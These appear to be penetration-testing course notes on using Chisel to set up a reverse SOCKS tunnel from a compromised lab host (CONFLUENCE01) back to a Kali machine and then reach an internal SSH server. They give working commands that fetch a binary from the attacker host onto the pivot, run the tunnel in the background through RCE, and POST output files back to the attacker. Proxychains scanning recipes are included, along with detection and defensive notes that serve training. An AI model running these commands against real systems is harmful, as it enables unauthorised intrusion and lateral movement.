## Overview

`chisel` is a cross-platform HTTP tunnelling tool that can encapsulate traffic inside HTTP/WebSocket connections.

It also uses SSH internally, so tunnelled data is encrypted.

Chisel is useful when:

```text
direct inbound access is blocked
SSH tunnelling is blocked or unavailable
only HTTP/HTTPS egress is allowed
deep packet inspection expects HTTP-formatted traffic
a compromised host can make outbound HTTP connections
SOCKS-style pivoting is needed
```

Chisel supports:

```text
Linux
Windows
macOS
multiple CPU architectures
reverse port forwards
SOCKS proxies
HTTP-based tunnelling
encrypted transport
```

---

# Core Concept

Chisel uses a client/server model.

```text
Chisel server
    waits for connections

Chisel client
    connects back to the server
```

In a reverse SOCKS setup:

```text
Kali runs the Chisel server
Compromised host runs the Chisel client
SOCKS proxy opens on Kali
Traffic sent to SOCKS proxy is tunnelled over HTTP
Compromised host forwards traffic to internal destinations
```

This is similar in purpose to:

```text
SSH remote dynamic port forwarding
```

but transported over HTTP/WebSocket.

# Example Scenario

## Hosts

|Role|Host|IP|
|---|---|---|
|Attack host|Kali|`192.168.118.4`|
|Compromised pivot|CONFLUENCE01|`192.168.50.63`|
|Internal SSH target|PGDATABASE01|`10.4.50.215`|

Goal:

```text
Use Chisel to create a reverse SOCKS proxy on Kali.

Then use that SOCKS proxy to reach SSH on PGDATABASE01.
```

# Traffic Flow

```text
Kali
192.168.118.4
Chisel server
SOCKS proxy: 127.0.0.1:1080
HTTP listener: 0.0.0.0:8080
    |
    | HTTP/WebSocket tunnel
    | initiated by CONFLUENCE01
    v
CONFLUENCE01
192.168.50.63
Chisel client
    |
    | Connects to requested internal destinations
    v
PGDATABASE01
10.4.50.215:22
SSH
```

Final application flow:

```text
ssh on Kali
↓
ProxyCommand using ncat
↓
SOCKS proxy 127.0.0.1:1080
↓
Chisel HTTP tunnel on TCP/8080
↓
CONFLUENCE01
↓
10.4.50.215:22
```

# Why Chisel Works Here

The tunnel between the Chisel client and server is HTTP-formatted.

This can help when:

```text
raw SSH is blocked
non-HTTP traffic is inspected or blocked
only HTTP/HTTPS traffic is allowed outbound
a compromised host can reach the attacker over TCP/80, TCP/443, or another allowed web port
```

Chisel uses WebSocket-style HTTP upgrade traffic.

Example observed request:

```text
GET / HTTP/1.1
Host: 192.168.118.4:8080
User-Agent: Go-http-client/1.1
Connection: Upgrade
Sec-WebSocket-Protocol: chisel-v3
Upgrade: websocket
```

# Key Mental Model

For this command on Kali:

```bash
chisel server --port 8080 --reverse
```

and this command on the pivot:

```bash
/tmp/chisel client 192.168.118.4:8080 R:socks
```

remember:

```text
Kali is the Chisel server.
CONFLUENCE01 is the Chisel client.
The client connects outbound to Kali.
The SOCKS proxy is created on Kali.
Internal connections are made from CONFLUENCE01.
```

# Chisel Server vs Client

## Chisel Server

Runs on the attacker-controlled machine.

In this scenario:

```text
Kali
192.168.118.4
```

Responsibilities:

```text
listens for the Chisel client
allows reverse tunnels
creates local SOCKS listener when requested
accepts traffic from local tools
sends traffic through the tunnel
```

---

## Chisel Client

Runs on the compromised pivot host.

In this scenario:

```text
CONFLUENCE01
192.168.50.63
```

Responsibilities:

```text
connects back to the Chisel server
maintains the tunnel
receives tunnelled requests
connects to internal destinations
```

---

## Internal Target

The final destination.

In this scenario:

```text
PGDATABASE01
10.4.50.215:22
```

This does not appear in the Chisel client command when using `R:socks`.

The destination is chosen dynamically by the SOCKS-aware client tool.

# 1. Stage Chisel on Kali

If Chisel is already installed:

```bash
which chisel
```

Copy it to Apache web root:

```bash
sudo cp $(which chisel) /var/www/html/
```

Start Apache:

```bash
sudo systemctl start apache2
```

Confirm the file is served:

```bash
ls -l /var/www/html/chisel
```

---

# 2. Download Chisel to the Pivot

From the compromised host, download the binary:

```bash
wget http://192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

In an RCE context, the same command may need to be embedded inside the exploit payload.

Example command string:

```bash
wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

Verify on the target where possible:

```bash
ls -l /tmp/chisel
/tmp/chisel -h
```

---

# 3. Start the Chisel Server

On Kali:

```bash
chisel server --port 8080 --reverse
```

Expected output:

```text
server: Reverse tunnelling enabled
server: Listening on http://0.0.0.0:8080
```

Meaning:

|Option|Purpose|
|---|---|
|`server`|Start Chisel in server mode|
|`--port 8080`|Listen for Chisel clients on TCP/8080|
|`--reverse`|Allow clients to request reverse tunnels|

---

# 4. Start tcpdump for Visibility

On Kali:

```bash
sudo tcpdump -nvvvXi tun0 tcp port 8080
```

Use this to confirm whether the target is reaching the Chisel server.

You should see traffic from:

```text
CONFLUENCE01 → Kali:8080
```

Example:

```text
192.168.50.63.<ephemeral_port> > 192.168.118.4.8080
```

---

# 5. Start the Chisel Client

On CONFLUENCE01:

```bash
/tmp/chisel client 192.168.118.4:8080 R:socks
```

For RCE/web-shell execution, background it:

```bash
/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
```

Command breakdown:

|Component|Meaning|
|---|---|
|`/tmp/chisel`|Chisel binary on the pivot|
|`client`|Run in client mode|
|`192.168.118.4:8080`|Chisel server on Kali|
|`R:socks`|Create reverse SOCKS proxy on the server|
|`> /dev/null 2>&1 &`|Suppress output and run in background|

---

# What `R:socks` Means

```text
R = reverse tunnel
socks = create a SOCKS proxy
```

In this scenario:

```text
The SOCKS listener is created on Kali.
The Chisel client on CONFLUENCE01 handles outbound connections to internal targets.
```

By default, `R:socks` binds the SOCKS proxy on:

```text
127.0.0.1:1080
```

on the Chisel server.

---

# 6. Confirm Chisel Connection

On the Chisel server, expect output similar to:

```text
session#2: Client version (...) differs from server version (...)
session#2: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

The important part is:

```text
R:127.0.0.1:1080=>socks: Listening
```

This means the reverse SOCKS proxy is active on Kali.

---

# 7. Confirm SOCKS Listener on Kali

On Kali:

```bash
ss -ntplu | grep 1080
```

Expected:

```text
127.0.0.1:1080
```

Example:

```text
tcp LISTEN 0 4096 127.0.0.1:1080 0.0.0.0:* users:(("chisel",pid=501221,fd=8))
```

This confirms:

```text
SOCKS proxy is listening locally on Kali.
```

# 8. Use the SOCKS Proxy

Tools that support SOCKS can use:

```text
127.0.0.1:1080
```

Tools that do not support SOCKS directly can often be used with:

```text
Proxychains
```

or, for SSH specifically:

```text
ProxyCommand
```

# SSH Through Chisel SOCKS

## Install Ncat

Kali's default Netcat may not support SOCKS proxying.

Install Ncat:

```bash
sudo apt install ncat
```

---

## SSH with ProxyCommand

Use Ncat as the SOCKS-aware connector:

```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
```

Command breakdown:

|Component|Meaning|
|---|---|
|`ssh`|SSH client on Kali|
|`-o ProxyCommand=...`|Use a helper command to create the TCP connection|
|`ncat`|SOCKS-aware connector|
|`--proxy-type socks5`|Use SOCKS5|
|`--proxy 127.0.0.1:1080`|Chisel SOCKS listener on Kali|
|`%h`|SSH replaces this with target host|
|`%p`|SSH replaces this with target port|
|`database_admin@10.4.50.215`|Real internal SSH target|

Flow:

```text
ssh database_admin@10.4.50.215
↓
ProxyCommand runs ncat
↓
ncat connects to 127.0.0.1:1080
↓
Chisel tunnel
↓
CONFLUENCE01
↓
10.4.50.215:22
```

# Proxychains Through Chisel SOCKS

Edit:

```bash
sudo nano /etc/proxychains4.conf
```

Set:

```text
[ProxyList]
socks5 127.0.0.1 1080
```

Then run tools through the tunnel:

```bash
proxychains nmap -sT -Pn -n -p 22 10.4.50.215
```

```bash
proxychains curl http://10.4.50.215/
```

```bash
proxychains psql -h 10.4.50.215 -U postgres
```

```bash
proxychains smbclient -L //10.4.50.215/ -U <user>
```

---

# Why Use `-sT`, `-Pn`, and `-n` with Nmap

When scanning through SOCKS:

```bash
proxychains nmap -sT -Pn -n -p <ports> <target_ip>
```

|Option|Reason|
|---|---|
|`-sT`|Uses TCP connect calls that Proxychains can intercept|
|`-Pn`|Skips host discovery probes that may not proxy cleanly|
|`-n`|Avoids DNS lookups outside the tunnel|

Avoid:

```bash
proxychains nmap -sS <target_ip>
```

Reason:

```text
SYN scans use raw packets and do not work reliably through SOCKS proxies.
```

# Troubleshooting

## Chisel Client Produces No Server Output

Check whether the pivot can reach the Chisel server:

```bash
tcpdump -nvvvXi tun0 tcp port 8080
```

Possible causes:

```text
wrong Kali IP
wrong Chisel server port
firewall blocks outbound connection
Chisel client did not execute
binary incompatible with target
RCE quoting issue
process exited immediately
```

---

## Capture Client Error Output from RCE

If the command is run through RCE and you cannot see errors, redirect output to a file and POST it back.

Command string:

```bash
/tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/
```

This helps recover errors such as:

```text
missing shared libraries
wrong architecture
permission denied
binary not executable
connection refused
```

---

## GLIBC Version Error

Example error:

```text
/tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found
/tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found
```

Meaning:

```text
The Chisel binary was compiled against a newer glibc than the target provides.
```

Common cause:

```text
Kali package binary compiled with a newer Go/glibc toolchain
older target operating system
```

Fix:

```text
Download a compatible release binary from the official Chisel releases page.
Use a statically linked or older-compatible build.
Match OS and architecture carefully.
```

Example lesson fix:

```bash
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
gunzip chisel_1.8.1_linux_amd64.gz
sudo cp ./chisel /var/www/html/
```

Then re-download to the target:

```bash
wget http://<kali_ip>/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

---

## Wrong Architecture

Symptoms:

```text
cannot execute binary file
exec format error
no output
process exits immediately
```

Check target architecture:

```bash
uname -a
uname -m
```

Choose matching Chisel binary:

```text
linux_amd64
linux_386
linux_arm64
windows_amd64
windows_386
```

## Permission Denied

Check execute bit:

```bash
ls -l /tmp/chisel
```

Fix:

```bash
chmod +x /tmp/chisel
```

If `/tmp` is mounted `noexec`, move to another writable executable path:

```bash
/dev/shm/chisel
/home/<user>/chisel
/var/tmp/chisel
```

## SSH Fails Through ProxyCommand

Check Ncat is installed:

```bash
which ncat
```

Install:

```bash
sudo apt install ncat
```

Test target port through SOCKS:

```bash
ncat --proxy-type socks5 --proxy 127.0.0.1:1080 10.4.50.215 22
```

Then retry:

```bash

```

---

## Nmap Is Slow

Use a smaller port set:

```bash
proxychains nmap -sT -Pn -n -p 22,80,443 <target_ip>
```

Reduce Proxychains timeouts carefully:

```text
tcp_read_time_out 3000
tcp_connect_time_out 1500
```

Avoid full port scans until the tunnel is stable.

# Detection and Defensive Notes

Potential indicators:

```text
chisel binary written to disk
outbound HTTP/WebSocket connection to attacker host
long-lived HTTP connection
Go-http-client user agent
Connection: Upgrade headers
Sec-WebSocket-Protocol: chisel-v3
SOCKS listener on attacker-controlled host
internal connections sourced from pivot host
Proxychains-style scanning through tunnel
```

Defensive controls:

```text
restrict outbound HTTP/HTTPS from servers
inspect long-lived WebSocket connections
monitor unusual Go-http-client traffic
alert on unknown binaries in /tmp or Windows Temp
monitor process execution of tunnelling tools
egress filtering by destination and protocol
block direct server-to-internet connectivity where unnecessary
proxy authentication and logging
network segmentation
```

# Chisel vs Other Pivot Methods

|Method|Transport|Dynamic?|Extra Tool?|Notes|
|---|---|--:|--:|---|
|Chisel reverse SOCKS|HTTP/WebSocket|Yes|Yes|Good through HTTP egress controls|
|SSH `-D`|SSH|Yes|SSH required|Common but SSH may be blocked|
|SSH remote dynamic `-R`|SSH|Yes|OpenSSH 7.6+|Creates SOCKS on SSH server|
|Plink `-R`|SSH|No|Plink|Static remote forwards only|
|Netsh portproxy|Native Windows TCP|No|No|Admin required, static TCP only|
|Socat|TCP|No|Yes|Flexible static forwarding|
|Ligolo-ng|TLS|Yes|Yes|Agent-based pivoting|
|Chisel static forward|HTTP/WebSocket|No|Yes|Useful for single services|

---

# Decision Guide

Use Chisel when:

```text
HTTP/HTTPS egress is allowed
SSH is blocked
you need SOCKS-style access
the pivot can run uploaded binaries
you need cross-platform tunnelling
you want reverse connectivity from pivot to attacker
```

Use SSH tunnelling when:

```text
SSH is allowed
OpenSSH or Plink is available
you do not need HTTP-formatted traffic
```

Use Netsh when:

```text
the pivot is Windows
you have admin privileges
you only need static TCP forwards
you cannot upload tools
```

Use Socat when:

```text
you need simple static forwarding
a compatible binary is available
HTTP wrapping is unnecessary
```

# Key Takeaways

- Chisel tunnels traffic over HTTP/WebSocket.
    
- Chisel uses SSH internally, so tunnelled data is encrypted.
    
- Chisel uses a client/server model.
    
- In reverse SOCKS mode, the compromised host connects back to Kali.
    
- The SOCKS proxy is created on Kali by default at `127.0.0.1:1080`.
    
- The pivot host makes the final internal connections.
    
- `chisel server --port 8080 --reverse` enables reverse tunnel support.
    
- `/tmp/chisel client <kali_ip>:8080 R:socks` requests a reverse SOCKS proxy.
    
- Use Proxychains or SSH `ProxyCommand` to send tools through the SOCKS listener.
    
- Use `ncat` for SSH `ProxyCommand` because Kali Netcat may not support SOCKS.
    
- Binary compatibility matters; glibc or architecture mismatches can break Chisel.
    
- Redirect command output to a file and POST it back when debugging blind RCE execution.
    
- Clean up binaries, background processes, and Proxychains changes when finished.
